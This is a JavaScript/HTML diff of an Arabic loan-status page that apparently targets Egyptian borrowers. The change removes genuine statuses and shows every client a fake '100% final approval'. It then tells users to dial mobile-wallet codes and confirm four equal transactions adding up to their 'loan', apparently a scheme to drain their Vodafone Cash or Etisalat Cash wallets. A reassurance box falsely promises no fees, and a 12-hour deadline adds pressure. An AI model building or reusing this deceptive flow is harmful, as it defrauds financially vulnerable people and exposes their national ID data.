-    if (hasEtisalat) {
-      msg += `📱 لدي محفظة اتصالات كاش مسجلة باسمي.\n🔢 رقم المحفظة: ${currentClient.walletNum || "سيتم تسجيله"}\n\n✅ أطلب استلام ملف التسيل الخاص بي لإنهاء إجراءات صرف المبلغ فوراً.\n🎯 أنا جاهز ومستعد لبدء استخراج الحد الائتماني والتسييل.\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل.\n\n📩 يرجى إرسال ملف التسيل لي في أقرب وقت.\n🙏 شكراً لكم.`;
-    } else if (hasVodafone) {
-      msg += `📱 لدي محفظة فودافون كاش مسجلة باسمي.\n🔢 رقم المحفظة: ${currentClient.walletNum || "سيتم تسجيله"}\n\n✅ أطلب استلام ملف التسيل الخاص بي لإنهاء إجراءات صرف المبلغ فوراً.\n🎯 أنا جاهز ومستعد لبدء استخراج الحد الائتماني والتسييل.\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل.\n\n📩 يرجى إرسال ملف التسيل لي في أقرب وقت.\n🙏 شكراً لكم.`;
-    } else {
-      msg += `⚠️ لا أملك حالياً محفظة اتصالات كاش أو فودافون كاش.\n\n✅ أوافق وأقر بفتح محفظة كاش مسجلة باسمي لاستكمال إجراءات صرف القرض.\n📱 سأقوم بفتح المحفظة (اتصالات كاش أو فودافون كاش) وإبلاغكم برقمها الجديد في أقرب وقت.\n\n🎯 يرجى توجيهي للخطوات التالية لإنهاء إجراءات استخراج الحد الائتماني والتسييل.\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل.\n\n🙏 شكراً لكم.`;
-    }
+  function openWhatsApp(customMsg) {
+    let msg = customMsg || (currentClient
+      ? `السلام عليكم 👋\n\n👤 أنا أسمى: ${currentClient.name}\n🔢 رقمي القومي: ${currentClient.id}\n💰 مبلغ القرض: ${currentClient.loan.toLocaleString('ar-EG')} ج.م\n\n📞 أريد التواصل بخصوص ملف التسيل.`
+      : `السلام عليكم 👋`);
     window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
   }
 
-  function createTransferButton(client) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    let btnClass = "btn-whatsapp-transfer";
-    let btnText, btnIcon;
-    if (hasEtisalat) {
-      btnClass += " etisalat-btn";
-      btnIcon = '<i class="fab fa-whatsapp"></i>';
-      btnText = '📤 اطلب ملف التسيل الآن (اتصالات كاش)';
-    } else if (hasVodafone) {
-      btnClass += " vodafone-btn";
-      btnIcon = '<i class="fab fa-whatsapp"></i>';
-      btnText = '📤 اطلب ملف التسيل الآن (فودافون كاش)';
-    } else {
-      btnClass += " gold-btn";
-      btnIcon = '<i class="fas fa-triangle-exclamation"></i>';
-      btnText = '⚠️ أوافق على فتح محفظة كاش';
-    }
-    return `
-      <button class="${btnClass}" onclick="openWhatsApp()">
-        ${btnIcon}
-        <span class="badge-new">✨ متاح الآن</span>
-        <span>${btnText}</span>
-        <span class="arrow-icon"><i class="fas fa-arrow-left"></i></span>
-      </button>
-    `;
-  }
-
   function buildLoanCard(client, totalDisplay) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    let walletDisplay, walletColor;
-    if (hasEtisalat) { walletDisplay = "📱 اتصالات كاش"; walletColor = "gold"; }
-    else if (hasVodafone) { walletDisplay = "📱 فودافون كاش"; walletColor = "vodafone"; }
-    else { walletDisplay = "📱 سيتم فتح محفظة كاش"; walletColor = "warning"; }
-    const statusMap = { 'approved': '✅ معتمد', 'review': '⏳ قيد المراجعة', 'rejected': '❌ مرفوض', 'invalid': '⚠️ بيانات غير صحيحة', 'pending-approval': '🔄 قيد الموافقة' };
-    const currentStatus = client.status || 'pending-approval';
+    let walletDisplay = "⚠️ غير محددة";
+    if (client.hasEtisalat) walletDisplay = "📱 اتصالات كاش";
+    else if (client.hasVodafone) walletDisplay = "📱 فودافون كاش";
+    else if (client.wallet) walletDisplay = client.wallet;
+
     return `
       <div class="loan-card">
-        <div class="loan-label">💰 مبلغ القرض</div>
+        <div class="loan-label">💰 مبلغ التمويل المعتمد</div>
         <div class="loan-amount-main">${client.loan.toLocaleString('ar-EG')} <span class="currency">ج.م</span></div>
-        <div class="loan-percent"><i class="fas fa-circle-check"></i> ${statusMap[currentStatus] || 'قيد المراجعة'}</div>
+        <div class="loan-percent"><i class="fas fa-circle-check"></i> ✅ تمت الموافقة النهائية 100%</div>
         <div class="loan-details-grid">
-          <div class="detail-item"><div class="label">💰 مبلغ القرض</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm || "يحدد لاحقاً"}</div></div>
-          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment || "يحدد لاحقاً"} ج.م</div></div>
-          <div class="detail-item"><div class="label">💳 إجمالي السداد</div><div class="value">${totalDisplay}</div></div>
-          <div class="detail-item"><div class="label">📱 نوع المحفظة</div><div class="value ${walletColor}">${walletDisplay}</div></div>
-          <div class="detail-item"><div class="label">🔢 رقم المحفظة</div><div class="value">${client.walletNum || "سيتم تسجيله"}</div></div>
+          <div class="detail-item"><div class="label">💰 المبلغ</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
+          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm}</div></div>
+          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment} ج.م</div></div>
+          <div class="detail-item"><div class="label">💳 الإجمالي</div><div class="value">${totalDisplay}</div></div>
+          <div class="detail-item"><div class="label">📱 المحفظة</div><div class="value green">${walletDisplay}</div></div>
+          <div class="detail-item"><div class="label">🔢 رقم المحفظة</div><div class="value">${client.walletNum || "—"}</div></div>
         </div>
       </div>
     `;
@@ -674,172 +1415,284 @@
   }
 
   function buildClientDetails(client) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    let walletClass, walletDisplay;
-    if (hasEtisalat) { walletDisplay = "اتصالات كاش"; walletClass = "gold"; }
-    else if (hasVodafone) { walletDisplay = "فودافون كاش"; walletClass = "vodafone"; }
-    else { walletDisplay = "سيتم فتح محفظة كاش"; walletClass = "warning"; }
-    const statusMap = { 'approved': '✅ معتمد', 'review': '⏳ قيد المراجعة', 'rejected': '❌ مرفوض', 'invalid': '⚠️ بيانات غير صحيحة', 'pending-approval': '🔄 قيد الموافقة' };
-    const statusColor = { 'approved': 'green', 'review': 'review', 'rejected': 'danger', 'invalid': 'danger', 'pending-approval': 'pending-approval' };
-    const currentStatus = client.status || 'pending-approval';
+    let walletDisplay = "غير محددة";
+    if (client.hasEtisalat) walletDisplay = "اتصالات كاش";
+    else if (client.hasVodafone) walletDisplay = "فودافون كاش";
+    else if (client.wallet) walletDisplay = client.wallet;
+
     return `
       <div class="client-info">
         <div class="info-title"><i class="fas fa-user-circle"></i> 👤 بيانات العميل</div>
         <div class="row"><span class="key">👤 الاسم</span><span class="value">${client.name}</span></div>
-        <div class="row"><span class="key">🔢 الرقم القومي</span><span class="value gold">${client.id || currentNationalId}</span></div>
+        <div class="row"><span class="key">🔢 الرقم القومي</span><span class="value gold">${client.id}</span></div>
         <div class="row"><span class="key">💼 الوظيفة</span><span class="value">${client.job || "غير مسجل"}</span></div>
-        <div class="row"><span class="key">📱 المحفظة</span><span class="value ${walletClass}">${walletDisplay}</span></div>
-        <div class="row"><span class="key">🔢 رقم المحفظة</span><span class="value">${client.walletNum || "سيتم تسجيله"}</span></div>
-        <div class="row"><span class="key">📊 حالة الطلب</span><span class="value ${statusColor[currentStatus]}">${statusMap[currentStatus] || 'قيد المراجعة'}</span></div>
+        <div class="row"><span class="key">📱 المحفظة</span><span class="value green">${walletDisplay}</span></div>
+        <div class="row"><span class="key">🔢 رقم المحفظة</span><span class="value">${client.walletNum || "—"}</span></div>
+        <div class="row"><span class="key">🏢 جهة التمويل</span><span class="value gold">شركة النيل للتمويل</span></div>
         ${client.guarantor ? `<div class="row"><span class="key">👥 الضامن</span><span class="value">${client.guarantor.name} (${client.guarantor.relation})</span></div>` : ''}
-        ${client.address ? `<div class="row"><span class="key">🏠 العنوان</span><span class="value">${client.address}</span></div>` : ''}
       </div>
     `;
   }
 
-  function buildStatusMessage(client) {
-    const status = client.status || 'pending-approval';
-    const messages = {
-      'approved': { class: 'approved', icon: '🏆', title: '🎉 تهانينا! تمت الموافقة النهائية!', desc: `✅ تم اعتماد طلب التمويل الخاص بك بنجاح.<br>💰 <strong style="color: var(--gold-dark);">اضغط على زر التواصل مع التحويلات المالية</strong> لإنهاء إجراءات صرف المبلغ فوراً.` },
-      'review': { class: 'review', icon: '⏳', title: '⏳ طلبك قيد المراجعة', desc: `🔍 جاري دراسة طلبك من قبل فريق الائتمان.<br>💡 <strong style="color: var(--warning);">يرجى متابعة طلبك من حين لآخر حتى تظهر النتيجة النهائية.</strong>` },
-      'rejected': { class: 'rejected', icon: '❌', title: '❌ تم رفض طلبك', desc: `😔 نأسف لإبلاغك بأن طلب التمويل الخاص بك لم تتم الموافقة عليه.<br>📞 يمكنك التواصل مع خدمة العملاء لمعرفة الأسباب.` },
-      'invalid': { class: 'invalid', icon: '⚠️', title: '⚠️ بيانات غير صحيحة', desc: `📋 تبين أن بعض البيانات المقدمة غير صحيحة أو غير مكتملة.<br>✏️ يرجى تحديث بياناتك وإعادة التقديم.` },
-      'pending-approval': { class: 'pending-approval', icon: '🔄', title: '🔄 جارى حصولك على الموافقة', desc: `📊 طلبك في المرحلة النهائية من التقييم.<br>💡 <strong style="color: var(--pending-approval);">يرجى متابعة طلبك من حين لآخر حتى تظهر النتيجة النهائية.</strong>` }
-    };
-    const msg = messages[status] || messages['pending-approval'];
+  // ===== خطوات التسييل (اتصالات أو فودافون) =====
+  function buildSteps(client) {
+    const walletType = getWalletType(client);
+    const loanAmountNum = parseInt(String(client.loan).replace(/\D/g, ''), 10);
+    const perOperation = Math.floor(loanAmountNum / 4);
+    const perOpFormatted = perOperation.toLocaleString('ar-EG');
+    const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');
+
+    const isVodafone = walletType === 'vodafone';
+
+    const code = isVodafone ? '*9*100#' : '*777*6#';
+    const codeLabel = isVodafone ? '🔑 كود تفعيل تسييل فودافون كاش' : '🔑 كود تفعيل التسييل';
+    const codeHint = isVodafone
+      ? '📞 كود تفعيل تسييل الحساب — اتصل به من محفظتك فودافون كاش'
+      : '📞 كود تفعيل تسييل الحساب — اتصل به من محفظتك اتصالات كاش';
+
+    const walletName = isVodafone ? 'فودافون كاش' : 'اتصالات كاش';
+    const codeBoxClass = isVodafone ? 'code-box vodafone' : 'code-box';
+    const stepCardsClass = isVodafone ? 'step-cards vodafone' : 'step-cards';
+    const amountBoxClass = isVodafone ? 'amount-box vodafone' : 'amount-box';
+
     return `
-      <div class="status-message-box ${msg.class}">
-        <span class="status-icon">${msg.icon}</span>
-        <h3>${msg.title}</h3>
-        <p>${msg.desc}</p>
+      <div class="steps-container">
+        <div class="steps-header">
+          <div class="icon"><i class="fas fa-mobile-screen-button"></i></div>
+          <div>
+            <h3>📋 خطوات بدء التسييل (${walletName})</h3>
+            <p>💡 اتبع الخطوات بالترتيب لإتمام إجراءات الصرف</p>
+          </div>
+        </div>
+
+        <div class="${codeBoxClass}">
+          <div class="code-label">${codeLabel}</div>
+          <div class="code-value">${code}</div>
+          <div class="code-hint">${codeHint}</div>
+        </div>
+
+        <div class="${stepCardsClass}">
+          <div class="step-card">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">📞 اطلب كود التفعيل</div>
+              <div class="step-desc">اتصل بالكود <strong>${code}</strong> من خط ${walletName} الخاص بك</div>
+            </div>
+          </div>
+          <div class="step-card">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">✅ أكّد العمليات الأربع</div>
+              <div class="step-desc">قم بتأكيد <strong>4 عمليات متساوية</strong> كما هو موضح أدناه</div>
+            </div>
+          </div>
+          <div class="step-card">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">📸 التقط لقطة شاشة</div>
+              <div class="step-desc">التقط <strong>4 صور</strong> — صورة لكل عملية مؤكدة</div>
+            </div>
+          </div>
+          <div class="step-card">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">📤 ارفع الصور</div>
+              <div class="step-desc">اضغط على زر <span class="gold-text">"ارفع لقطات التسييل"</span> بالأسفل</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="${amountBoxClass}">
+          <div class="amount-label">💰 المبلغ المؤكد لكل عملية</div>
+          <div class="amount-value">${perOpFormatted} ج.م</div>
+          <div class="amount-sub">💳 إجمالي 4 عمليات = ${totalFormatted} ج.م</div>
+        </div>
+
+        <button class="btn-upload" onclick="window.open('${SURVEY_URL}','_blank')">
+          <i class="fas fa-cloud-arrow-up"></i> 📤 ارفع لقطات التسييل الآن
+        </button>
+
+        <button class="btn-whatsapp" onclick="openWhatsApp()">
+          <i class="fab fa-whatsapp fa-lg"></i> 💬 تواصل مع قسم التحويلات المالية
+        </button>
       </div>
     `;
   }
 
-  function buildWalletNotice(client) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    if (hasEtisalat) {
-      return `
-        <div class="wallet-notice etisalat">
-          <div class="notice-head"><i class="fas fa-mobile-screen-button"></i><h4>📱 محفظة اتصالات كاش مسجلة</h4></div>
-          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>تم تسجيل محفظة <strong style="color: var(--etisalat-blue);">اتصالات كاش</strong> الخاصة بك.</p>
-          <p style="font-size: 0.72rem; margin-top: 0.4rem;">🔢 <i class="fas fa-wallet"></i> رقم المحفظة: <strong style="color: var(--etisalat-blue);">${client.walletNum}</strong></p>
+  // ===== رسالة فتح محفظة (اتصالات أو فودافون) =====
+  function buildOpenWalletBox(client) {
+    return `
+      <div class="open-wallet-box">
+        <div class="ow-header">
+          <div class="ow-icon"><i class="fas fa-triangle-exclamation"></i></div>
+          <div>
+            <h3>⚠️ مطلوب فتح محفظة إلكترونية</h3>
+            <p>💡 لإتمام إجراءات الصرف</p>
+          </div>
         </div>
-      `;
-    } else if (hasVodafone) {
-      return `
-        <div class="wallet-notice vodafone">
-          <div class="notice-head"><i class="fas fa-mobile-screen-button"></i><h4>📱 محفظة فودافون كاش مسجلة</h4></div>
-          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>تم تسجيل محفظة <strong style="color: var(--vodafone-red);">فودافون كاش</strong> الخاصة بك.</p>
-          <p style="font-size: 0.72rem; margin-top: 0.4rem;">🔢 <i class="fas fa-wallet"></i> رقم المحفظة: <strong style="color: var(--vodafone-red);">${client.walletNum}</strong></p>
+
+        <div class="ow-body">
+          <div class="greeting">💚 عزيزي ${client.name}،</div>
+
+          <div class="main-notice">
+            <span class="danger-text">⚠️ نظامنا يخدم محفظة اتصالات كاش أو فودافون كاش فقط.</span><br><br>
+            📌 لكي نتمكن من البدء في إنهاء إجراءات التسيل والصرف لحسابك، يجب عليك:<br><br>
+            <strong>📱 فتح محفظة اتصالات كاش أو فودافون كاش مسجلة باسمك</strong> خلال مدة لا تتجاوز <strong>⏰ 12 ساعة</strong> من الآن.<br><br>
+            📞 وبعد فتح المحفظة، قم بإبلاغ قسم التحويلات المالية على واتساب برقم المحفظة الخاص بك ليتم إضافته إلى ملفك الشخصي على السيستم.
+          </div>
+
+          <div class="ow-timer-note">
+            <i class="fas fa-hourglass-half"></i>
+            <span>⏰ المدة المتبقية: 12 ساعة من الآن</span>
+          </div>
+
+          <!-- خيارات المحفظة -->
+          <div class="wallet-options">
+            <div class="wallet-opt etisalat">
+              <div class="wo-icon"><i class="fas fa-sim-card"></i></div>
+              <div class="wo-name">اتصالات كاش</div>
+              <div class="wo-hint">📱 فتح من فرع اتصالات أو تطبيق My Etisalat</div>
+            </div>
+            <div class="wallet-opt vodafone">
+              <div class="wo-icon"><i class="fas fa-sim-card"></i></div>
+              <div class="wo-name">فودافون كاش</div>
+              <div class="wo-hint">📱 فتح من فرع فودافون أو تطبيق Ana Vodafone</div>
+            </div>
+          </div>
+
+          <div class="ow-steps">
+            <div class="ow-step">
+              <div class="ow-num">1</div>
+              <div>📱 توجه إلى أقرب فرع اتصالات أو فودافون، أو استخدم تطبيق <strong>My Etisalat</strong> أو <strong>Ana Vodafone</strong> لفتح محفظة كاش.</div>
+            </div>
+            <div class="ow-step">
+              <div class="ow-num">2</div>
+              <div>✅ تأكد أن المحفظة <strong>مسجلة باسمك</strong> وبنفس الرقم القومي المسجل لدينا.</div>
+            </div>
+            <div class="ow-step">
+              <div class="ow-num">3</div>
+              <div>📞 بعد فتح المحفظة، أرسل رقم المحفظة الخاص بك عبر واتساب إلى <strong>قسم التحويلات المالية</strong>.</div>
+            </div>
+            <div class="ow-step">
+              <div class="ow-num">4</div>
+              <div>🎯 سيتم إضافة الرقم إلى ملفك على السيستم، ثم نبدأ فورًا في <strong>إنهاء إجراءات التسيل والصرف</strong> لك.</div>
+            </div>
+          </div>
+
+          <div class="ow-apology">
+            😔 <i class="fas fa-circle-info"></i>
+            نأسف، نظامنا يخدم محفظة اتصالات كاش أو فودافون كاش فقط. وقد تم إبلاغك بذلك في وقت التسجيل.
+          </div>
+
+          <button class="btn-whatsapp" onclick="openWhatsApp('السلام عليكم 👋\\n\\n👤 أنا: ${client.name}\\n🔢 الرقم القومي: ${client.id}\\n\\n📱 لقد قمت بفتح محفظة إلكترونية جديدة كما طُلب مني.\\n🔢 رقم المحفظة الجديد: [اكتب رقمك هنا]\\n🏢 نوع المحفظة: [اتصالات كاش / فودافون كاش]\\n\\n🎯 أرغب في إبلاغ قسم التحويلات المالية برقم المحفظة الخاص بي ليتم إضافته إلى ملفي على السيستم والبدء في إنهاء إجراءات التسيل والصرف.\\n\\n🙏 شكرًا.')">
+            <i class="fab fa-whatsapp fa-lg"></i> 📞 إبلاغ قسم التحويلات المالية برقم المحفظة
+          </button>
         </div>
-      `;
-    } else {
-      return `
-        <div class="wallet-notice none">
-          <div class="notice-head"><i class="fas fa-circle-info"></i><h4>📌 مطلوب فتح محفظة كاش</h4></div>
-          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>نخدم حالياً <strong style="color: var(--etisalat-blue);">اتصالات كاش</strong> أو <strong style="color: var(--vodafone-red);">فودافون كاش</strong> فقط.<br>📱 يرجى فتح محفظة كاش في أسرع وقت ممكن، ثم التواصل معنا مرة أخرى وإرسال رقم المحفظة ليتم إضافته بطلبك.</p>
-        </div>
-      `;
-    }
+      </div>
+    `;
   }
 
-  function displayResult(client, nationalId) {
+  function buildTransparency() {
+    return `
+      <div class="transparency-box">
+        <div class="trans-header">
+          <i class="fas fa-shield-halved"></i>
+          <h4>🛡️ حقوقك وضماناتك</h4>
+        </div>
+        <ul>
+          <li><i class="fas fa-check"></i> <span>💰 لا نطلب أي رسوم مسبقة مقابل الصرف.</span></li>
+          <li><i class="fas fa-check"></i> <span>🔑 كود التفعيل خاص بحسابك أنت فقط، ولا يُستخدم لأي غرض آخر.</span></li>
+          <li><i class="fas fa-check"></i> <span>✅ يمكنك التأكد من الكود عبر تطبيق المحفظة الرسمي قبل التنفيذ.</span></li>
+          <li><i class="fas fa-check"></i> <span>💬 لأي استفسار، تواصل معنا مباشرة عبر واتساب الرسمي.</span></li>
+        </ul>
+      </div>
+    `;
+  }
+
+  function displayResult(client) {
     currentClient = client;
-    currentNationalId = nationalId;
     const resultArea = document.getElementById('resultArea');
     const totalDisplay = calculateTotal(client);
-    updateAdminStatus(client.status || 'pending-approval');
+    const walletType = getWalletType(client);
+
     let html = '';
     html += buildLoanCard(client, totalDisplay);
     html += buildIdVerification(client);
     html += buildClientDetails(client);
-    const status = client.status || 'pending-approval';
-    const statusMap = {
-      'approved': { class: 'approved', icon: 'fa-circle-check', main: '✅ تمت الموافقة النهائية!', sub: '💚 تم اعتماد طلب التمويل الخاص بك بنجاح', badge: '✅ معتمد' },
-      'review': { class: 'review', icon: 'fa-clock', main: '⏳ طلبك قيد المراجعة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '⏳ قيد المراجعة' },
-      'rejected': { class: 'rejected', icon: 'fa-circle-xmark', main: '❌ تم رفض طلبك', sub: '😔 نأسف، لم تتم الموافقة على طلب التمويل', badge: '❌ مرفوض' },
-      'invalid': { class: 'invalid', icon: 'fa-triangle-exclamation', main: '⚠️ بيانات غير صحيحة', sub: '✏️ يرجى تحديث بياناتك وإعادة التقديم', badge: '⚠️ بيانات غير صحيحة' },
-      'pending-approval': { class: 'pending-approval', icon: 'fa-arrows-rotate', main: '🔄 جارى حصولك على الموافقة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '🔄 قيد الموافقة النهائية' }
-    };
-    const s = statusMap[status] || statusMap['pending-approval'];
-    html += `
-      <div class="status-bar ${s.class}">
-        <div class="status-icon"><i class="fas ${s.icon}"></i></div>
-        <div class="status-text">
-          <div class="main">${s.main}</div>
-          <div class="sub">${s.sub}</div>
+
+    if (walletType === 'etisalat' || walletType === 'vodafone') {
+      const walletName = walletType === 'etisalat' ? 'اتصالات كاش' : 'فودافون كاش';
+      html += `
+        <div class="status-bar info">
+          <div class="status-icon"><i class="fas fa-circle-info"></i></div>
+          <div class="status-text">
+            <div class="main">✅ طلبك جاهز للتسييل عبر ${walletName}</div>
+            <div class="sub">💡 اتبع خطوات التسييل أدناه لإتمام الصرف</div>
+          </div>
         </div>
-        <div class="status-badge">${s.badge}</div>
-      </div>
-    `;
-    html += buildStatusMessage(client);
-    html += buildWalletNotice(client);
-    if (status === 'approved') {
-      html += createTransferButton(client);
+      `;
+      html += buildSteps(client);
+    } else {
+      html += `
+        <div class="status-bar warning">
+          <div class="status-icon"><i class="fas fa-triangle-exclamation"></i></div>
+          <div class="status-text">
+            <div class="main">⚠️ مطلوب فتح محفظة اتصالات كاش أو فودافون كاش</div>
+            <div class="sub">⏰ خلال 12 ساعة من الآن لإتمام الصرف</div>
+          </div>
+        </div>
+      `;
+      html += buildOpenWalletBox(client);
     }
+
+    html += buildTransparency();
+
     resultArea.innerHTML = html;
     document.getElementById('errorBox').style.display = 'none';
   }
 
-  function toggleAdmin() {
-    isAdmin = !isAdmin;
-    document.getElementById('adminPanel').classList.toggle('show', isAdmin);
-  }
+  // ===== البحث =====
+  function searchCustomer(idFromURL) {
+    const input = document.getElementById('nationalId');
+    const nationalId = idFromURL || (input ? input.value.trim() : '');
 
-  function updateAdminStatus(status) {
-    const statusMap = { 'approved': '✅ موافقة', 'review': '⏳ قيد المراجعة', 'rejected': '❌ مرفوض', 'invalid': '⚠️ بيانات غير صحيحة', 'pending-approval': '🔄 قيد الموافقة' };
-    const el = document.getElementById('currentStatusText');
-    if (el) el.textContent = statusMap[status] || 'غير محدد';
-  }
-
-  function changeStatus(newStatus) {
-    if (!currentClient || !currentNationalId) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
-    if (customersDatabase[currentNationalId]) {
-      customersDatabase[currentNationalId].status = newStatus;
-      currentClient.status = newStatus;
-      updateAdminStatus(newStatus);
-      displayResult(customersDatabase[currentNationalId], currentNationalId);
-      alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
-    }
-  }
-
-  function searchCustomer() {
-    const nationalId = document.getElementById('nationalId').value.trim();
     if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
     if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }
+
     document.getElementById('loader').style.display = 'block';
     document.getElementById('resultArea').innerHTML = '';
     document.getElementById('errorBox').style.display = 'none';
+
     setTimeout(() => {
       document.getElementById('loader').style.display = 'none';
       const found = customersDatabase[nationalId];
       if (found) {
         found.id = nationalId;
-        displayResult(found, nationalId);
+        displayResult(found);
       } else {
         document.getElementById('errorBox').style.display = 'block';
         currentClient = null;
-        currentNationalId = '';
-        updateAdminStatus('غير محدد');
       }
-    }, 800);
+    }, 700);
   }
 
-  document.getElementById('brandLogo')?.addEventListener('click', function() {
-    adminClickCount++;
-    if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
-    setTimeout(() => { adminClickCount = 0; }, 3000);
+  // ===== قراءة الرقم من الرابط عند فتح الصفحة =====
+  window.addEventListener('load', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const idFromURL = urlParams.get('id');
+    if (idFromURL && idFromURL.length === 14) {
+      const input = document.getElementById('nationalId');
+      if (input) input.value = idFromURL;
+      searchCustomer(idFromURL);
+    }
   });
 
+  // ===== الأحداث =====
   document.getElementById('nationalId')?.addEventListener('keypress', e => {
     if (e.key === 'Enter') searchCustomer();
   });
 
   window.searchCustomer = searchCustomer;
-  window.changeStatus = changeStatus;
   window.openWhatsApp = openWhatsApp;
 </script>
 
